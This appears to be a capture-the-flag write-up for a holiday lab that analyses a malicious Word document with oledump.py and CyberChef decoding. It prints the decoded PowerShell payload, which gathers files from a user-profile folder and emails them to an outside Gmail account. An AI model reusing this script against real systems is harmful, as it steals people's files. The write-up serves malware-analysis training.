## TASK-1/2/3/4 What is the username, password, subject, port?

Boot up the machine and inside the Tools folder we have a a tool called OleDump.py which will help us in dumping the OLE.<br>
Run this command ```oledump.py -d -s 8 ../../Santa_Claus_Naughty_List_2021/Santa_Claus_Naughty_List_2021.doc``` and grab the base64 value.<br>
Open your browser and go to [CyberChef](https://gchq.github.io/CyberChef). Paste in the copied string and add custom rules as.

1) From Base64
2) XOR keyvalue-35 (Decimal)
3) From Base64

and you should have the decoded powershell string.

```powershell
#Credits goes to @ManiarViral (https://twitter.com/maniarviral) for writing this awesome RAT!

$username="Grinch.REDACTED.2021@gmail.com"
$password="S@ntai$REDACTEDt0wn"
$smtpServer = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage

$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, REDACTED) 

$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)

$msg.From = "santaspresentsdelivery@gmail.com"

$msg.To.Add("Grinch.Enterprises.2021@gmail.com")

$msg.Body="Your presents have arrived!"

$msg.Subject = "REDACTED"

$files=Get-ChildItem "$env:USERPROFILE\REDACTED\Grinch2021\"

Foreach($file in $files)
{
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
$attachment.Dispose();
$msg.Dispose();
```

## TASK-5 What is the flag hidden found in the document that Grinch Enterprises left behind? 

Run the command ```oledump.py -d -s 7 ../../Santa_Claus_Naughty_List_2021/Santa_Claus_Naughty_List_2021.doc``` and get the flag from Caption. ```YouREDACTEDCookie```

## TASK-6 There is still a second flag somewhere... can you find it on the machine?

Note that there is a path to files in the script. Go to the path and inside the ```flag2``` file you have your flag.

<h3><b>That's it for Day-22. Happy Hacking!</b></h3>

